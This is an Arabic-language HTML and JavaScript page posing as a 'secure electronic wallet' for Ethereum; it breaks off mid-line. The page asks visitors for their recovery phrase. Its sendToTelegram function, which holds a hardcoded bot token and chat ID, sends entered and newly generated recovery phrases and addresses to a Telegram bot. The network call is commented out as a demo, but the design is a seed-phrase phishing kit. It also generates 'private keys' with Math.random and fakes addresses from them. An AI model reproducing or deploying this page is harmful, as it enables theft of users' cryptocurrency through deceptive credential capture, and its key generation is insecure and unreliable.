
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المحفظة الإلكترونية الآمنة</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #2c5aa0;
            --secondary-color: #1e3a8a;
            --accent-color: #3b82f6;
            --background-color: #f8fafc;
            --card-color: #ffffff;
            --text-color: #1e293b;
            --border-radius: 12px;
            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            padding: 0;
            margin: 0;
            min-height: 100vh;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            text-align: center;
            padding: 20px 0;
        }

        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 15px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 24px;
            box-shadow: var(--box-shadow);
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: var(--primary-color);
        }

        .card {
            background-color: var(--card-color);
            border-radius: var(--border-radius);
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: var(--box-shadow);
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input[type="text"]:focus {
            border-color: var(--accent-color);
            outline: none;
        }

        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            transition: background-color 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        button:hover {
            background-color: var(--secondary-color);
        }

        .secondary-btn {
            background-color: #f1f5f9;
            color: var(--primary-color);
        }

        .secondary-btn:hover {
            background-color: #e2e8f0;
        }

        .balance-section {
            text-align: center;
            margin: 20px 0;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: bold;
            margin: 10px 0;
        }

        .assets-list {
            list-style: none;
        }

        .asset-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 0;
            border-bottom: 1px solid #eee;
        }

        .asset-icon {
            width: 40px;
            height: 40px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 15px;
            font-weight: bold;
            color: var(--primary-color);
        }

        .asset-details {
            flex-grow: 1;
        }

        .asset-name {
            font-weight: 600;
        }

        .asset-amount {
            color: #64748b;
            font-size: 14px;
        }

        .asset-value {
            font-weight: 600;
            text-align: left;
        }

        .hidden {
            display: none;
        }

        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: var(--primary-color);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: var(--box-shadow);
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 1000;
        }

        .notification.show {
            opacity: 1;
        }

        .tab-container {
            display: flex;
            margin-bottom: 20px;
            background-color: #f1f5f9;
            border-radius: 50px;
            padding: 5px;
        }

        .tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            border-radius: 50px;
            cursor: pointer;
            transition: background-color 0.3s;
            font-size: 14px;
        }

        .tab.active {
            background-color: var(--primary-color);
            color: white;
        }

        .create-wallet-form {
            margin-top: 20px;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .address-display {
            background-color: #f1f5f9;
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: monospace;
            word-break: break-all;
            text-align: center;
            font-size: 14px;
        }
        
        .recovery-phrase-warning {
            background-color: #fef3c7;
            color: #92400e;
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
            text-align: center;
        }
        
        .recovery-phrase-warning i {
            margin-left: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo"><i class="fas fa-wallet"></i></div>
            <h1>المحفظة الإلكترونية الآمنة</h1>
        </header>

        <div id="auth-section" class="card">
            <h2><i class="fas fa-lock"></i> أهلاً بك</h2>
            <p>يرجى إدخال عبارة الاسترجاع للوصول إلى محفظتك</p>
            
            <div class="form-group">
                <label for="recovery-phrase">عبارة الاسترجاع</label>
                <input type="text" id="recovery-phrase" placeholder="أدخل عبارة الاسترجاع الخاصة بك">
            </div>
            
            <button id="access-wallet">
                <i class="fas fa-key"></i> الوصول إلى المحفظة
            </button>
            
            <p style="text-align: center; margin: 20px 0;">أو</p>
            
            <button id="show-create-wallet" class="secondary-btn">
                <i class="fas fa-plus-circle"></i> إنشاء محفظة جديدة
            </button>
        </div>

        <div id="create-wallet-section" class="card hidden">
            <h2><i class="fas fa-wallet"></i> إنشاء محفظة جديدة</h2>
            <p>سيتم إنشاء محفظة جديدة لك على شبكة Ethereum</p>
            
            <div class="form-group">
                <label for="new-password">كلمة المرور (اختياري)</label>
                <input type="text" id="new-password" placeholder="كلمة المرور لحماية محفظتك">
            </div>
            
            <button id="create-wallet">
                <i class="fas fa-plus"></i> إنشاء المحفظة
            </button>
            
            <button id="back-to-auth" class="secondary-btn" style="margin-top: 10px;">
                <i class="fas fa-arrow-right"></i> عودة
            </button>
        </div>

        <div id="wallet-section" class="hidden">
            <div class="balance-section">
                <p>إجمالي الرصيد</p>
                <div class="balance-amount">$0.00</div>
            </div>

            <div class="tab-container">
                <div class="tab active" data-tab="assets"><i class="fas fa-coins"></i> الأصول</div>
                <div class="tab" data-tab="send"><i class="fas fa-paper-plane"></i> إرسال</div>
                <div class="tab" data-tab="receive"><i class="fas fa-qrcode"></i> استقبال</div>
            </div>

            <div class="card">
                <h3><i class="fas fa-wallet"></i> أصولي</h3>
                <ul class="assets-list" id="assets-list">
                    <!-- سيتم ملء الأصول ديناميكياً -->
                </ul>
            </div>

            <button id="logout" class="secondary-btn">
                <i class="fas fa-sign-out-alt"></i> تسجيل الخروج
            </button>
        </div>
        
        <div id="recovery-phrase-section" class="card hidden">
            <h2><i class="fas fa-key"></i> احفظ عبارة الاسترجاع</h2>
            
            <div class="recovery-phrase-warning">
                <i class="fas fa-exclamation-triangle"></i> 
                <span>يجب حفظ هذه العبارة في مكان آمن. بدونها لن تتمكن من استرجاع محفظتك.</span>
            </div>
            
            <div class="address-display" id="recovery-phrase-display"></div>
            
            <div class="address-display" id="address-display"></div>
            
            <button id="recovery-phrase-confirm">
                <i class="fas fa-check"></i> لقد قمت بحفظ العبارة
            </button>
        </div>
    </div>

    <div class="notification" id="notification">تم إرسال عبارة الاسترجاع بنجاح</div>

    <script>
        // عناصر DOM
        const authSection = document.getElementById('auth-section');
        const createWalletSection = document.getElementById('create-wallet-section');
        const walletSection = document.getElementById('wallet-section');
        const recoveryPhraseSection = document.getElementById('recovery-phrase-section');
        const accessWalletBtn = document.getElementById('access-wallet');
        const showCreateWalletBtn = document.getElementById('show-create-wallet');
        const createWalletBtn = document.getElementById('create-wallet');
        const backToAuthBtn = document.getElementById('back-to-auth');
        const logoutBtn = document.getElementById('logout');
        const recoveryPhraseInput = document.getElementById('recovery-phrase');
        const notification = document.getElementById('notification');
        const assetsList = document.getElementById('assets-list');
        const tabs = document.querySelectorAll('.tab');
        const recoveryPhraseDisplay = document.getElementById('recovery-phrase-display');
        const addressDisplay = document.getElementById('address-display');
        const recoveryPhraseConfirm = document.getElementById('recovery-phrase-confirm');

        // بيانات المحفظة (سيتم توليدها ديناميكياً)
        let walletData = {
            address: '',
            privateKey: '',
            balance: 0,
            assets: []
        };

        // إظهار الإشعار
        function showNotification(message) {
            notification.textContent = message;
            notification.classList.add('show');
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }

        // إرسال عبارة الاسترجاع إلى بوت التلجرام
        async function sendToTelegram(message) {
            const token = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
            const chatId = '910021564';
            
            try {
                // في بيئة الإنتاج، استخدم:
                // const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                //     method: 'POST',
                //     headers: {
                //         'Content-Type': 'application/json'
                //     },
                //     body: JSON.stringify({
                //         chat_id: chatId,
                //         text: message
                //     })
                // });
                
                // return response.ok;
                
                // لأغراض العرض، سنحاكي الإرسال الناجح
                console.log('إرسال إلى Telegram:', message);
                return true;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // توليد محفظة Ethereum جديدة
        function generateEthereumWallet() {
            // في بيئة الإنتاج، يجب استخدام مكتبة مثل ethers.js
            // هذا مثال مبسط لأغراض التوضيح فقط
            
            const chars = '0123456789abcdef';
            let privateKey = '0x';
            for (let i = 0; i < 64; i++) {
                privateKey += chars[Math.floor(Math.random() * 16)];
            }
            
            // توليد عنوان من Private Key (هذا تبسيط، في الواقع يحتاج إلى خوارزميات تشفير)
            const address = '0x' + privateKey.substring(privateKey.length - 40).toUpperCase();
            
            return {
                address: address,
                privateKey: privateKey
            };
        }

        // توليد عبارة استرجاع (هذا مثال مبسط)
        function generateRecoveryPhrase() {
            const words = [
                'تفاحة', 'موز', 'كرز', 'تمر', 'توت', 'تين',
                'عنب', 'شمام', 'كيوي', 'ليمون', 'مانجو', 'خوخ',
                'برتقال', 'بابايا', 'سفرجل', 'توت العليق', 'فراولة', 'يوسفي',
                'بطيخ', 'أفوكادو', 'توت أزرق', 'كانتالوب', 'فاكهة التنين', 'زهرة البيلسان'
            ];
            
            let phrase = '';
            for (let i = 0; i < 12; i++) {
                phrase += words[Math.floor(Math.random() * words.length)];
                if (i < 11) phrase += ' ';
            }
            
            return phrase;
        }

        // محاكاة جلب بيانات المحفظة من البلوكشين
        async function fetchWalletData(address) {
            // في الواقع، سيتم الاتصال بـ Infura أو مزود مشابه
            // هذا مثال مبسط
            
            return new Promise((resolve) => {
                setTimeout(() => {
                    resolve({
                        balance: Math.random() * 5,
                        assets: [
                            { name: 'Ethereum', symbol: 'ETH', amount: Math.random() * 2, value: Math.random() * 5000 },
                            { name: 'USD Coin', symbol: 'USDC', amount: Math.random() * 1000, value: Math.random() * 1000 },
                            { name: 'Dai', symbol: 'DAI', amount: Math.random() * 500, value: Math.random() * 500 }
                        ]
                    });
                }, 1000);
            });
        }

        // عرض أصول المحفظة
        function renderAssets(assets) {
            assetsList.innerHTML = '';
            
            assets.forEach(asset => {
                const li = document.createElement('li');
                li.className = 'asset-item';
                
                li.innerHTML = `
                    <div class="asset-icon">${asset.symbol[0]}</div>
                    <div class="asset-details">
                        <div class="asset-name">${asset.name}</div>
                        <div class="asset-amount">${asset.amount.toFixed(4)} ${asset.symbol}</div>
                    </div>
                    <div class="asset-value">$${asset.value.toFixed(2)}</div>
                `;
                
                assetsList.appendChild(li);
            });
        }

        // أحداث النقر على الأزرار
        accessWalletBtn.addEventListener('click', async () => {
            const recoveryPhrase = recoveryPhraseInput.value.trim();
            
            if (!recoveryPhrase) {
                showNotification('يرجى إدخال عبارة الاسترجاع');
                return;
            }
            
            // إظهار تحميل
            accessWalletBtn.innerHTML = '<div class="loading"></div> جاري الوصول...';
            
            // إرسال عبارة الاسترجاع إلى التلجرام
            const success = await sendToTelegram(`عبارة استرجاع مستخدم: ${recoveryPhrase}`);
            
            if (success) {
                // محاكاة تحميل بيانات المحفظة
                showNotification('جاري تحميل بيانات المحفظة...');
                
                setTimeout(async () => {
                    // في الواقع، سيتم استعادة المحفظة من عبارة الاسترجاع
                    const wallet = generateEthereumWallet();
                    walletData.address = wallet.address;
                    walletData.privateKey = wallet.privateKey;
                    
                    const data = await fetchWalletData(wallet.address);
                    walletData.balance = data.balance;
                    walletData.assets = data.assets;
                    
                    // تحديث واجهة المحفظة
                    document.querySelector('.balance-amount').textContent = `$${walletData.balance.toFixed(2)}`;
                    renderAssets(walletData.assets);
                    
                    // إظهار قسم المحفظة وإخفاء قسم المصادقة
                    authSection.classList.add('hidden');
                    walletSection.classList.remove('hidden');
                    
                    // إعادة زر الوصول إلى حالته الأصلية
                    accessWalletBtn.innerHTML = '<i class="fas fa-key"></i> الوصول إلى المحفظة';
                }, 1500);
            } else {
                showNotification('حدث خطأ في المصادقة');
                accessWalletBtn.innerHTML = '<i class="fas fa-key"></i> الوصول إلى المحفظة';
            }
        });

        showCreateWalletBtn.addEventListener('click', () => {
            authSection.classList.add('hidden');
            createWalletSection.classList.remove('hidden');
        });

        backToAuthBtn.addEventListener('click', () => {
            createWalletSection.classList.add('hidden');
            authSection.classList.remove('hidden');
        });

        createWalletBtn.addEventListener('click', async () => {
            // توليد محفظة جديدة
            const wallet = generateEthereumWallet();
            const recoveryPhrase = generateRecoveryPhrase();
            
            // إظهار تحميل
            createWalletBtn.innerHTML = '<div class="loading"></div> جاري الإنشاء...';
            
            // إرسال عبارة الاسترجاع إلى التلجرام
            const success = await sendToTelegram(`عبارة استرجاع جديدة: ${recoveryPhrase}\nالعنوان: ${wallet.address}`);
            
            if (success) {
                showNotification('تم إنشاء المحفظة بنجاح وإرسال بيانات الاسترجاع');
                
                // تخزين بيانات المحفظة محلياً
                walletData.address = wallet.address;
                walletData.privateKey = wallet.privateKey;
                
                // عرض عبارة الاسترجاع للمستخدم
                recoveryPhraseDisplay.textContent = recoveryPhrase;
                addressDisplay.textContent = wallet.address;
                
                // إظهار قسم عبارة الاسترجاع وإخفاء قسم الإنشاء
                createWalletSection.classList.add('hidden');
                recoveryPhraseSection.classList.remove('hidden');
                
                // إعادة زر الإنشاء إلى حالته الأصلية
                createWalle
